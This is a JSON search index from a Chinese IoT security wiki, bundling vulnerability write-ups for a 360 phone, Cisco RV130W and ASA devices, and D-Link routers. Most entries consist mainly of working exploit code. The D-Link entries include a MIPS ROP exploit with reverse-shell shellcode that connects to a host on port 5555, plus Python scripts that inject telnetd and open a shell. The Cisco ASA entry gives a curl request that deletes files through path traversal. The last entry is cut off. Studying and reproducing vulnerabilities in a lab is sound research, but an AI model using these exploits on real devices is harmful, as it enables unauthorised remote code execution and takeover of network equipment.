{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-08-28 13:23:14 "},"IOT安全/360/360 Phone N6 Pro内核漏洞/360 Phone N6 Pro内核漏洞.html":{"url":"IOT安全/360/360 Phone N6 Pro内核漏洞/360 Phone N6 Pro内核漏洞.html","title":"360 Phone N6 Pro内核漏洞","keywords":"","body":"360 Phone N6 Pro内核漏洞 一、漏洞简介 360 Phone N6 Pro V096内核组件中的内核模块允许攻击者使用命令3235427072在设备/ dev / block / mmcblk0rpmb上通过ioctl的自变量注入精心设计的自变量，并导致内核崩溃。 二、漏洞影响 名称：360 Phone N6 Pro 型号：1801-A01 安卓版本：7.1.1 版本号：V096 内核版本：Linux localhost 4.4.21-perf＃1 SMP PREEMPT Wed Mar 28 28 15:24:20 UTC 2018 aarch64 三、复现过程 poc /* * This is poc of 360 N6 Pro, 1801-A01 * Android Version: 7.1.1 * Version Number: V096 * Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64 * A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072. * This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb. */ #include #include #include #include const static char *driver = \"/dev/block/mmcblk0rpmb\"; static command = 3235427072; // 0xc0d8b300 int main(int argc, char **argv, char **env) { int fd = 0; fd = open(driver, O_RDWR); if (fd /data/local/tmp/log\"); return -1; } printf(\"Try ioctl device file '%s', with command 0x%x and payload NULLn\", driver, command); printf(\"System will crash and reboot.n\"); if(ioctl(fd, command, NULL) /data/local/tmp/log\"); return -1; } close(fd); return 0; } Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:45:53 "},"IOT安全/Cisco/（CVE-2019-1663）堆栈缓冲区溢出漏洞/（CVE-2019-1663）堆栈缓冲区溢出漏洞.html":{"url":"IOT安全/Cisco/（CVE-2019-1663）堆栈缓冲区溢出漏洞/（CVE-2019-1663）堆栈缓冲区溢出漏洞.html","title":"（CVE-2019-1663）堆栈缓冲区溢出漏洞","keywords":"","body":"（CVE-2019-1663）堆栈缓冲区溢出漏洞 一、漏洞简介 CVE-2019-1663是一个影响Cisco的多个低端设备的堆栈缓冲区，由于管理界面没有对登录表单的pwd字段进行严格的过滤，底层在处理请求时，strcpy函数导致堆栈溢出，未经身份验证的远程攻击者可以在设备上执行任意代码 二、漏洞影响 Cisco RV110W 三、复现过程 0x01 固件提取 这里我使用时Cisco RV130W 1.0.3.44进行测试的，binwalk对固件进行提取 可以看出文件系统是squashfs,并且是小端存储方式,得到一个类Linux目录 0x02 分析处理请求 使用 grep -r “http”来查找处理http请求的二进制文件 根据之前分析的多个嵌入式设备的经验，猜测这个可能就是处理http请求的底层文件 0x03 漏洞分析 对Web登录界面的login.cgi发送如下的POST请求 POST /login.cgi HTTP/1.1 Host: 10.10.10.2 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://10.10.10.2/ Content-Type: application/x-www-form-urlencoded Content-Length: 137 Connection: close Upgrade-Insecure-Requests: 1 submit_button=login&submit_type=&gui_action=&wait_time=0&change_action=&enc=1&user=cisco&pwd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&sel_lang=EN 这里向pwd发送32字节的值，对登录界面的http处理请求在IDA中的是sub_2C614()，地址是0x0002C614 函数将POST请求的参数进行解析，存储到.bss段 然后，将pwd参数的值从.bss段中提取，调用strcpy将值存到动态分配的内存中 对于strcpy我们都很熟悉，它存在的安全问题也十分严峻，并且由于没有开启PIE / ASLR，所以可以随意的进行溢出操作 这里使用gdb进行远程调试，确定能够发生溢出的字节数，首先设置cisco,作为gdb调试的服务端，gdbserver配置 # wget http://10.10.10.1:8000/gdbserver //从本机下载到qemu模拟的cisco环境中 #chmod 777 ./gdbserver //给权限 # ps -w | grep httpd //查找httpd开启的进程号 2451 0 5472 S ./usr/sbin/httpd 2454 0 1196 S grep httpd # ./gdbserver :1234 --attach 2451 //这里的1234是开启监听的端口号，--attach添加的是httpd的进程号 Attached; pid = 2451 Listening on port 1234 //然后成功监听 编译arm-gdb-linux tar xvf gdb-7.8.1.tar.gz cd gdb-7.8.1 mkdir arm-gdb sudo chmod 777 arm-gdb sudo apt-get install texinfo ./configure --target=arm-linux --prefix=/home/clb/1tools/gdb-7.8.1/arm-gdb make && make install 然后在arm-gdb下的bin目录中就有用于调试的arm-linux-gdb，配置调试选项 ./arm-linux-gdb gef> set architecture arm //确定要调试的是arm架构 gef> set follow-fork-mode child //确定调试的进程 gef> set solib-search-path /home/clb/1iot/firmware/cisco/_RV130.bin.extracted/squashfs-root/lib/ //加载要用到的lib文件 gef> file /home/clb/1iot/firmware/cisco/_RV130.bin.extracted/squashfs-root/usr/sbin/httpd //加载调试文件 gef> target remote 10.10.10.2:1234 //与远程建立连接 已经建立调试连接，可以进行调试了 查找溢出的位置，使用pattern生成512个字符串 gef➤ patter create 512 [+] Generating a pattern of 512 bytes aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf [+] Saved as '$_gef0' 通过curl发送POST请求查找溢出的位置 gef➤ c Continuing. Program received signal SIGSEGV, Segmentation fault. 0x616d6560 in ?? () 通过pattern确定溢出的大小 gef➤ pattern search 0x616d6561 [+] Searching '0x616d6561' [+] Found at offset 446 (little-endian search) likely 我们可以确定要进行填充的字符串是有446个字节 这里使用Ret2Libc进行利用。ret2libc 这种攻击方式主要是针对 动态链接(Dynamic linking) 编译的程序，因为正常情况下是无法在程序中找到像 system() 、execve() 这种系统级函数(如果程序中直接包含了这种函数就可以直接控制返回地址指向他们，而不用通过这种麻烦的方式)。因为程序是动态链接生成的，所以在程序运行时会调用 libc.so (程序被装载时，动态链接器会将程序所有所需的动态链接库加载至进程空间，libc.so 就是其中最基本的一个)，libc.so 是 linux 下 C 语言库中的运行库glibc 的动态链接版，并且 libc.so 中包含了大量的可以利用的函数，包括 system() 、execve() 等系统级函数，我们可以通过找到这些函数在内存中的地址覆盖掉返回地址来获得当前进程的控制权。通常情况下，我们会选择执行 system(“/bin/sh”) 来打开 shell。这里我们使用vmmap查看调用的lib文件有哪些 注：由于是在模拟器中查找的lib文件的起始地址，所以和在真机中的地址可能不太一样 这里我们选择具有执行权限的libc.so.0文件，使用radare2对libc.so.0文件进行搜索system函数 这里的system函数的地址是偏移地址，偏移地址加上vmmap得到的起始地址就是，我们通过下断点得到system函数的地址，然后通过计算可以发现地址完全正确 这时我们已经知道了一些关键的地址，那么这个时候我们就需要构造一个 ROP链，来实现地址的跳转 这里使用了一款工具Ropper，因为我们存储的位置位于堆栈，所以查找跟堆栈有关的指针SP 这里我选择了0x00041308的指令，因为这里有一个关于指令跳转的指令BLX，如果r2存的值是system的地址，那么我们就能跳到system处，执行系统命令了，并且由于我们的值都存在栈中，所以我们就需要查找和pop,r2有关的指令 在ARM指令集下我们发现两个对r2的操作，但是后面还跟着别的指令，如果我们使用了某一个，那么我们还得继续寻找能够完整构造payload的指令。由于ARM除了有ARM指令外，还有一个Thumb指令集，这个指令是ARM指令集的一个子集，但是在某些方面比ARM指令集要更有效，我们切换指令集去这里看看符合我们要求的指令 这里我们找到了没有其他指令参与并且堆栈操作十分符合我们要求的指令，下面就是我们构造的堆栈的排列方式 首先排布的是target1，这条指令就是对栈就行弹出的操作，首先将system的地址弹出到r2，然后后面无用的地址弹出到r6，最后将target2的地址弹出到r15中，并且r15中存储的还是正在取指的地址。紧接着执行r15所指向的地址，首先将sp的地址存储到r0中，然后执行blx跳转指令并且切换指令集，并且跳转到r2的地址，也就是system的地址，那么这时候就成功执行system函数，到此整个ROP链也就执行完毕 0x04 漏洞复现 这里我们利用的是exploit-db上的exp 设置rhosts,lhosts和target，然后直接exploit，就能直接获得shell权限，这里我在vps上执行的 成功执行ifconfig命令 0x05 exp脚本分析 这里存储就是偏移地址，libc_base的地址，system的偏移地址，gadget1的偏移地址，gadget2的偏移地址，这些地址就是真机中真正的偏移地址 这里就是根据不同的target生成不同的payload 这里就是我们对Msf生成的payload进行输出，可以看到被攻击的设备下载了可以在ARM平台进行回来的文件，并给与权限并执行，最终创建一个shell 参考链接 http://lab.xinruisec.com/2019/09/20/CVE-2019-1663-Cisco%E7%9A%84%E5%A4%9A%E4%B8%AA%E4%BD%8E%E7%AB%AF%E8%AE%BE%E5%A4%87%E7%9A%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:45:58 "},"IOT安全/CISCO ASA/CISCO ASA设备任意文件删除漏洞/CISCO ASA设备任意文件删除漏洞.html":{"url":"IOT安全/CISCO ASA/CISCO ASA设备任意文件删除漏洞/CISCO ASA设备任意文件删除漏洞.html","title":"CISCO ASA设备任意文件删除漏洞","keywords":"","body":"CISCO ASA设备任意文件删除漏洞 漏洞描述 Cisco ASA Software和FTD Software中的Web服务接口存在路径遍历漏洞，该漏洞源于程序没有对HTTP URL进行正确的输入验证。远程攻击者可通过发送带有目录遍历序列的特制HTTP请求利用该漏洞读取并删除系统上的敏感信息。 漏洞影响 Cisco ASA设备、Cisco FTD设备 FOFA /+CSCOE+/&&Cisco-ASA 漏洞复现 访问 http://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html 存在则可能出现此漏洞 例如我们删除一张图片 http://xxx.xxx.xxx.xxx/+CSCOU+/csco_logo.gif 使用 curl 发送请求 curl -H \"Cookie: token=../+CSCOU+/csco_logo.gif\" https://xxx.xxx.xxx.xxx/+CSCOE+/session_password.html 成功删除图标 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:03 "},"IOT安全/D-Link/（CVE-2018-19986）D-Link DIR-818LW&828命令注入漏洞/（CVE-2018-19986）D-Link DIR-818LW&828命令注入漏洞.html":{"url":"IOT安全/D-Link/（CVE-2018-19986）D-Link DIR-818LW&828命令注入漏洞/（CVE-2018-19986）D-Link DIR-818LW&828命令注入漏洞.html","title":"（CVE-2018-19986）D-Link DIR-818LW&828命令注入漏洞","keywords":"","body":"（CVE-2018-19986）D-Link DIR-818LW&828命令注入漏洞 一、漏洞简介 D-Link DIR-822和D-Link DIR-818LW都是中国台湾友讯（D-Link）公司的一款无线路由器。 D-Link DIR-818LW Rev.A 2.05.B03和DIR-822 B1 202KRb06中的‘RemotePort’参数存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 二、漏洞影响 D-Link DIR-818LW Rev.A 2.05.B03 DIR-822 B1 202KRb06 三、复现过程 漏洞分析 原理 D-Link DIR-818LW Rev.A 2.05.B03和DIR-822 B1 202KRb06中，通过HNAP1协议访问SetRouterSettings时，RemotePort参数存在操作系统命令注入漏洞。在SetRouterSettings.php源码中，RemotPort参数没有经过任何检查，直接存放于$path_inf_wan1.\"/web\"，并且在iptwan.php中的IPTWAN_build_command函数中使用$path_inf_wan1.\"/web\"变量作为iptables的参数，同样未做检查。构造SetRouterSettings.xml，使RemotePort中包含如telnetd的shell命令，利用该漏洞执行非法操作系统命令。 ./etc/templates/hnap/SetRouterSettings.php： $path_inf_wan1 = XNODE_getpathbytarget(\"\", \"inf\", \"uid\", $WAN1, 0); #$WAN1 = \"WAN-1\"; $nodebase=\"/runtime/hnap/SetRouterSettings/\"; …… $remotePort = query($nodebase.\"RemotePort\"); …… set($path_inf_wan1.\"/web\", $remotePort); ./etc/services/IPTABLES/iptwan.php function IPTWAN_build_command($name){ $path = XNODE_getpathbytarget(\"\", \"inf\", \"uid\", $name, 0); …… $web = query($path.\"/web\"); …… #web作为iptables的参数写入$_GLOBALS[\"START\"] if (query($path.\"/inbfilter\") != \"\") $inbfn = cut(query($path.\"/inbfilter\"), 1, \"-\"); $hostip = query($path.\"/weballow/hostv4ip\"); if ($hostip != \"\") { if (query($path.\"/inbfilter\")!=\"\") fwrite(\"a\",$_GLOBALS[\"START\"], $iptcmd.\" -p tcp --dport \".$web.\" \".\"-j CK_INBOUND\".$inbfn.\"\\n\"); fwrite(\"a\",$_GLOBALS[\"START\"], $iptcmd.\" -s \".$hostip.\" -p tcp --dport \".$web.\" -j ACCEPT\\n\"); } else { if (query($path.\"/inbfilter\")!=\"\") fwrite(\"a\",$_GLOBALS[\"START\"], $iptcmd.\" -p tcp --dport \".$web.\" \".\"-j CK_INBOUND\".$inbfn.\"\\n\"); fwrite(\"a\",$_GLOBALS[\"START\"], $iptcmd.\" -p tcp --dport \".$web.\" -j ACCEPT\\n\"); } …… } PS：服务器的web目录为/htdocs/web/ 关于HNAP The Home Network Administration Protocol (HNAP) is an HTTP-Simple Object Access Protocol (SOAP)-based protocol that can be implemented inside of network devices to allow advanced programmatic configuration and management by remote entities. HNAP是由Pure Networks开发的协议，后续由Cisco管理与开发。HNAP用于网络设备之间的交互，该协议基于SOAP和HTTP，以post的方式发包。 使用HNAP：在HTTP header中加入SOAPAction，该字段中会指明请求的操作，如Login，并向http://[ip]/HNAP1发送数据，数据形式为xml。 举个栗子，下图是登录时的抓包： 192.168.0.1向路由器192.168.0.2发送数据，在SOAPAction中指定了请求内容。 路由器收到之后以LoginResponse回复发送方，返回了一些登录需要的关键数据. 发送方收到之后，login的action由request变成了login，即发送用户名密码的过程，密码是由用户私钥处理过的数据。 路由器验证登录的用户名和密码，返回登录成功信息。 理解HNAP 为了再深入理解HNAP，查看/htdocs/cgibin二进制文件，简化流程如下： hnap_main(){ memset(acStack1708,0,0x100); getenv(\"HTTP_AUTHORIZATION\"); soapaction = getenv(\"HTTP_SOAPACTION\"); request_method = getenv(\"REQUEST_METHOD\"); hnap_auth = getenv(\"HTTP_HNAP_AUTH\"); cookie = getenv(\"HTTP_COOKIE\"); referer = getenv(\"HTTP_REFERER\"); memset(php_path,0,0x100); //当未指定soapaction时，默认请求为GetDeviceSettings if (soapaction == (char *)0x0) { soapaction = \"http://purenetworks.com/HNAP1/GetDeviceSettings\"; …… } else{ …… __s1 = strstr(soapaction,\"http://purenetworks.com/HNAP1/Login\"); if (__s1 != (char *)0x0) { …… parse_param_value(uVar2,\"Action\",action); parse_param_value(uVar2,\"Username\",username); parse_param_value(uVar2,\"LoginPassword\",pwd); parse_param_value(uVar2,\"Captcha\",captcha); iVar1 = strcmp(action,\"request\"); //当action为request时 if (iVar1 == 0) { //产生一个长度为0X32的随机字符串 //例：LVy04tz2fCRlZIu8vefr1OCKu9qTOQaktWkwOhy3rNnQfhWaKB get_random_string(random_string,0x32); //cookie_value为前十个字符 //例：LVy04tz2fC strncpy(cookie_value,random_string,10); //challenge为接下来20个字符 //例：RlZIu8vefr1OCKu9qTOQ strncpy(random_challenge,random_string_10,0x14); //public key为接下来20个字符 //例：aktWkwOhy3rNnQfhWaKB strncpy(public_key,random_string_30,0x14); sprintf(public_key_and_0,\"%s%s\",public_key,0); strcpy(COOKIE,cookie_value); strcpy(CHALLENGE,random_challenge); //HMAC_MD5就是常见的HMAC，hash算法为MD5。这里函数的输出放在第三个参数中 //例：hmac_1=E188583458DE427B6A71C2DD04CB632C HMAC_MD5(random_challenge,public_key_and_0,hmac_1); …… //set challenge,privatekey,captcha //返回soap xml }//end of action=request else{ if(strcmp(action,\"login\")==0 && cookie !=0) { find_uid = strstr(cookie,\"uid=\"); if (find_uid == (char *)0x0) goto LAB_004137fc; //获取cookie的值 strncpy(cookie_value,find_uid + 4,10); //检查cookie __fd=get_cgdata_by_uid(acStack1904,cookie_value); if (__fd /dev/console\"; } else { __format = \"sh %s%s.sh > /dev/console &\"; } //执行该脚本 //var_run变量对应的字符是\"/var/run/\" snprintf(acStack1708,0x100,__format,&var_run,operation); system(acStack1708); …… } 漏洞执行顺序 在上面的hnap_main代码中，代入本漏洞SetRouterSettings的情况，最后会执行sh /var/run/SetRouterSettings.sh，这个脚本是动态生成的，在模拟固件并执行poc成功之后查看内容（还没找到具体生成sh脚本的代码） #!/bin/sh echo \"[$0]-->RouterSettings Change\" > /dev/console event DBSAVE > /dev/console service HTTP.WAN-1 start > /dev/console #here！！！ xmldbc -s /runtime/hnap/dev_status '' > /dev/console HTTP.WAN-1是一种服务，对应于/etc/services/HTTP.WAN-1.php，该服务会开启IPT.WAN-1服务 /etc/services/IPT.WAN-1.php会执行之前所说的iptables命令 漏洞复现 import requests import telnetlib from hashlib import md5 import time import math trans_5C = \"\".join(chr(x ^ 0x5c) for x in xrange(256)) trans_36 = \"\".join(chr(x ^ 0x36) for x in xrange(256)) blocksize = md5().block_size def hmac_md5(key, msg): if len(key) > blocksize: key = md5(key).digest() key += chr(0) * (blocksize - len(key)) o_key_pad = key.translate(trans_5C) i_key_pad = key.translate(trans_36) return md5(o_key_pad + md5(i_key_pad + msg).digest()) def HNAP_AUTH(SOAPAction, privateKey): b = math.floor(int(time.time())) % 2000000000 b = str(b)[:-2] h = hmac_md5(privateKey, b + '\"http://purenetworks.com/HNAP1/' + SOAPAction + '\"').hexdigest().upper() return h + \" \" + b #输入IP和admin口令，通过读hnap_main的二进制，理解初始状态admin的口令为空（public_key_0：0代表空值） IP = '192.168.0.1' adminPw = '' command = \"telnetd\" # command injection id headers = requests.utils.default_headers() headers[\"User-Agent\"] = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36\" headers[\"SOAPAction\"] = '\"http://purenetworks.com/HNAP1/Login\"' headers[\"Origin\"] = \"http://\" + IP headers[\"Referer\"] = \"http://\" + IP + \"/info/Login.html\" headers[\"Content-Type\"] = \"text/xml; charset=UTF-8\" headers[\"X-Requested-With\"] = \"XMLHttpRequest\" #构造一个action为request的请求发送给Login payload = 'requestAdmin' r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) data = r.text #通过获取的publickey计算privatekey，根据privatekey计算口令的hmac(在上文中对应的是hmac_1) challenge = str(data[data.find(\"\") + 11: data.find(\"\")]) cookie = data[data.find(\"\") + 8: data.find(\"\")] publicKey = str(data[data.find(\"\") + 11: data.find(\"\")]) privateKey = hmac_md5(publicKey + adminPw, challenge).hexdigest().upper() password = hmac_md5(privateKey, challenge).hexdigest().upper() #构造action为login的请求，发送用户名和口令 headers[\"HNAP_AUTH\"] = HNAP_AUTH(\"Login\", privateKey) headers[\"Cookie\"] = \"uid=\" + cookie payload = 'loginAdmin'+password+'' r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) #登录成功后访问SetRouterSettings设置路由器的一些配置，其中RemotePort被设置为command headers[\"Origin\"] = \"http://\" + IP headers[\"HNAP_AUTH\"] = HNAP_AUTH(\"SetRouterSettings\", privateKey) headers[\"SOAPaction\"] = '\"http://purenetworks.com/HNAP1/SetRouterSettings\"' headers[\"Accept\"] = \"text/xml\" payload = open('{}.xml'.format(\"CVE-2018-19986\")).read().replace('ip', IP).replace('COMMAND', command) print '[*] command injection' r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) print(r.text) print '[*] waiting 30 sec...' time.sleep(30) #利用成功之后，服务端已经开启了Telnet服务，攻击者可直接连服务器的Telnet print '[*] enjoy your shell' telnetlib.Telnet(IP).interact() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:05 "},"IOT安全/D-Link/（CVE-2018-20056）D-Link DIR-619L&605L 栈溢出漏洞/（CVE-2018-20056）D-Link DIR-619L&605L 栈溢出漏洞.html":{"url":"IOT安全/D-Link/（CVE-2018-20056）D-Link DIR-619L&605L 栈溢出漏洞/（CVE-2018-20056）D-Link DIR-619L&605L 栈溢出漏洞.html","title":"（CVE-2018-20056）D-Link DIR-619L&605L 栈溢出漏洞","keywords":"","body":"（CVE-2018-20056）D-Link DIR-619L&605L 栈溢出漏洞 一、漏洞简介 D-LINK的DIR-619L Rev.B 2.06B1版本之前和DIR-605L Rev.B 2.12B1版本之前的设备，在/bin/boa文件的formLanguage函数中存在缓冲区溢出漏洞，在调用sprintf函数时没有对参数的长度进行检查，导致远程攻击者可以通过访问 http://[ip]/goform/formLanguageChange并指定currTime参数实现远程代码执行。 固件下载地址：ftp://ftp2.dlink.com/PRODUCTS/DIR-619L/REVB/ 二、漏洞影响 D-LINK的DIR-619L Rev.B 2.06B1版本之前和DIR-605L Rev.B 2.12B1版本之前的设备。 三、复现过程 漏洞分析 在formLanguageChange函数中，通过websGetVar获取config.i18n_language，nextPage，currTime等参数。websGetVar通过malloc、memcpy将获取到的参数返回给formLanguageChange。formLanguageChange接下来调用了sprintf危险函数向local_f8变量中读入参数内容，并在下一步websRedirect使用了local_f8作为参数。 void formLanguageChange(undefined4 uParm1) { int iVar1; char *pcVar2; undefined4 uVar3; FILE *__stream; char *__s1; char local_f8 [200]; char acStack48 [24]; undefined4 local_18; int local_14; __s1 = (char *)websGetVar(uParm1,\"config.i18n_language\",&DAT_004ac874); …… apmib_set(0x129,&local_18); __s1 = (char *)websGetVar(uParm1,\"nextPage\",&DAT_004ac874); if (*__s1 == 0) { uVar3 = websGetVar(uParm1,\"currTime\",&DAT_004ac874);//获取currTime参数 __s1 = \"/index.asp\"; } else { …… } sprintf(local_f8,\"%s?t=%s\",__s1,uVar3);//危险函数sprintf直接读入字符 LAB_00460b34: websRedirect(uParm1,local_f8); …… return; } websRedirect主要调用send_r_moved_perm，这个函数调用了两次危险函数sprintf，分别向acStack224(sp+0x19f8-0xe0)和acStack480(sp+0x19f8-0x1e0)中输入字符。 undefined4 websRedirect(int iParm1,char *pcParm2) { char *pcVar1; *(undefined4 *)(iParm1 + 0x50) = 0; pcVar1 = strstr(pcParm2,\"/apply_setting.asp\"); if (pcVar1 != (char *)0x0) { apply_setting_redirect = apply_setting_redirect + 1; } send_r_moved_perm(iParm1,pcParm2); return 0; } void send_r_moved_perm(int iParm1,char *pcParm2) { undefined4 uVar1; char *pcVar2; undefined auStack6624 [6144]; char acStack480 [256]; char acStack224 [200]; …… if (pcVar2 == (char *)0x0) { if (*pcParm2 == '/') { pcParm2 = pcParm2 + 1; } sprintf(acStack224,\"http://%s/%s\",*(undefined4 *)(iParm1 + 0x70),pcParm2); pcParm2 = acStack224; } sprintf(acStack480, \"\\r\\n\\t\\tThis document has moved to a new location.\\r\\n\\t\\tPlease update your documents to reflect the newlocation.\\r\\n\\t\\t\\r\\n\" ,pcParm2); ……s return; } 通过第二两个sprintf修改返回地址，构造ROP链，导致程序控制流被劫持。（也可以通过两个sprintf的配合来实现栈的迁移，漏洞作者是这么实现的） 漏洞复现 poc import requests import sys import struct from pwn import * #context.log_level='debug' context.arch='mips' context.endian='big' ip='192.168.75.150' def syscmd1(a): p=remote(ip,80) z=len(a) print \"[+]len:\"+str(z) payload='' payload+='POST /goform/formLanguageChange HTTP/1.1\\r\\n' payload+='Host: '+ip+'\\r\\n' payload+='Connection: keep-alive\\r\\n' payload+='Accept-Encoding: gzip, deflate\\r\\n' payload+='Accept: */*\\r\\n' payload+='User-Agent: python-requests/2.18.4\\r\\n' payload+='Content-Length: '+str(z+9)+'\\r\\n' payload+='Content-Type: application/x-www-form-urlencoded\\r\\n' payload+='\\r\\n' payload+='currTime=' payload+=a+'\\r\\n' p.send(payload) p.recvuntil('') #raw_input() p.close() #base address of libc.so.0 base1=0x2ab88000 ###shellcode sc=struct.pack(\">I\",0x24060101) sc+=struct.pack(\">I\",0x04d0ffff) sc+=struct.pack(\">I\",0x2806ffff) sc+=struct.pack(\">I\",0x27bdffe0) sc+=struct.pack(\">I\",0x27e41001) sc+=struct.pack(\">I\",0x2484f023) sc+=struct.pack(\">I\",0xafa4ffe8) sc+=struct.pack(\">I\",0xafa0ffec) sc+=struct.pack(\">I\",0x27a5ffe8) sc+=struct.pack(\">I\",0x24020fab) sc+=struct.pack(\">I\",0xafa00108) sc+=struct.pack(\">I\",0x0101010c) sc+=\"/bin//sh\\x00\" shellcode ='' shellcode += asm(shellcraft.connect('192.168.75.149',5555)) shellcode += asm(shellcraft.dup2(5,0)) shellcode += asm(shellcraft.dup2(5,1)) shellcode += sc s0=struct.pack(\">I\",base1+0x2C794) s1=struct.pack(\">I\",base1+0x2C794)### rop2:move $t9,$s2;...;jr $t9 s2=struct.pack(\">I\",base1+0x24b70)### rop3:sleep(1) s3=struct.pack(\">I\",base1+0x2bdac)### rop5:addiu $a0,$sp,0x18;...;lw $ra,0x30;jr $ra s4=struct.pack(\">I\",base1+0x2bdac) ###rop payload1='a'*0x167+s0+s1+s2+s3 payload1+=struct.pack(\">I\",base1+0x25714) ###rop1: li $a0,1;move $t9,$s1;jalr $t9;ori $a1,$s0,2 payload1+='b'*0x1c+s0+s1+s2+s3+s4 payload1+=struct.pack(\">I\",base1+0x5f98) ###rop4:lw $ra,0x1c($sp);...;jr $ra payload1+='c'*0x1c payload1+=s3 payload1+='d'*0x18 payload1+=struct.pack(\">I\",0x24910101) ###rop7 addiu $s1,$a0,257;addi $s1,$s1,-257;move $t9,$s1;jalr $t9 payload1+=struct.pack(\">I\",0x2231feff) payload1+=struct.pack(\">I\",0x0220c821) payload1+=struct.pack(\">I\",0x0320f809) payload1+=struct.pack(\">I\",0x2231feff) payload1+=struct.pack(\">I\",0x2231feff) payload1+=struct.pack(\">I\",base1+0x2bda0) ###rop6:mov $t9,$a0;...;jalr $t9 payload1+='e'*0x20+shellcode if __name__ == \"__main__\": syscmd1(payload1) 利用效果: Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:07 "},"IOT安全/D-Link/（CVE-2018-20057）D-Link DIR-619L&605L 命令注入漏洞/（CVE-2018-20057）D-Link DIR-619L&605L 命令注入漏洞.html":{"url":"IOT安全/D-Link/（CVE-2018-20057）D-Link DIR-619L&605L 命令注入漏洞/（CVE-2018-20057）D-Link DIR-619L&605L 命令注入漏洞.html","title":"（CVE-2018-20057）D-Link DIR-619L&605L 命令注入漏洞","keywords":"","body":"（CVE-2018-20057）D-Link DIR-619L&605L 命令注入漏洞 一、漏洞简介 D-LINK的DIR-619L Rev.B 2.06B1版本之前和DIR-605L Rev.B 2.12B1版本之前的设备，在/bin/boa文件的formSysCmd函数存在后门，导致攻击者在身份认证后可以通过访问 http://[ip]//goform/formSysCmd并指定sysCmd参数，从而实现远程命令注入。 固件下载地址：ftp://ftp2.dlink.com/PRODUCTS/DIR-619L/REVB/ 本漏洞的路由器运行环境与CVE-2018-20056相同。 二、漏洞影响 D-LINK的DIR-619L Rev.B 2.06B1版本之前和DIR-605L Rev.B 2.12B1版本之前的设备。 三、复现过程 漏洞分析 查看ghidra中的反编译代码，在formSysCmd中，首先获取sysCmd参数，然后通过snprintf写入栈中变量，直接调用system函数执行该参数内容。 void formSysCmd(undefined4 uParm1) { undefined4 uVar1; char *pcVar2; char acStack120 [104]; uVar1 = websGetVar(uParm1,\"submit-url\",&DAT_004ac874); //获取post参数sysCmd，该参数可由用户控制 pcVar2 = (char *)websGetVar(uParm1,\"sysCmd\",&DAT_004ac874); if (*pcVar2 != 0) { //将sysCmd写入栈中，并调用system执行 snprintf(acStack120,100,\"%s 2>&1 > %s\",pcVar2,\"/tmp/syscmd.log\"); system(acStack120); } websRedirect(uParm1,uVar1); return; } 漏洞复现 该漏洞是在身份认证成功之后才可实现命令注入，需要先登录输入用户名和口令。由于是在qemu中模拟固件，通过apmib_get读取路由器本地配置无法实现，所以在劫持了apmib_get函数之后，login输入的用户名和密码暂时填为空。在真机上操作时，换成真实的用户名和密码即可。 import requests import sys import struct import base64 from pwn import * context(arch='mips',endian='big',log_level='debug') ip='192.168.84.129' port=101 def login(user,password): postData = { 'login_name':'', 'curTime':'1234', 'FILECODE':'', 'VER_CODE':'', 'VERIFICATION_CODE':'', 'login_n':user, 'login_pass':base64.b64encode(password), } response = requests.post('http://'+ip+'/goform/formLogin',data=postData) #print response.url def syscmd(cmd): postData = { 'sysCmd':cmd, 'submit-url':'1234', } response = requests.post('http://'+ip+'/goform/formSysCmd',data=postData) #print response.url def inter(): p=remote(ip,port) p.interactive() if __name__ == \"__main__\": login('','')#这里要写实际的用户名和密码，例如admin 12345 syscmd('telnetd -p '+str(port)) inter() 另由于qemu模拟时，/dev下没有pty设备，导致telnet连接不能实现，但是端口是已经打开了： Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:07 "},"IOT安全/D-Link/（CVE-2019-13128）D-Link DIR-823G 命令注入漏洞/（CVE-2019-13128）D-Link DIR-823G 命令注入漏洞.html":{"url":"IOT安全/D-Link/（CVE-2019-13128）D-Link DIR-823G 命令注入漏洞/（CVE-2019-13128）D-Link DIR-823G 命令注入漏洞.html","title":"（CVE-2019-13128）D-Link DIR-823G 命令注入漏洞","keywords":"","body":"影响版本 DIR823GA1_FW102B03 漏洞描述 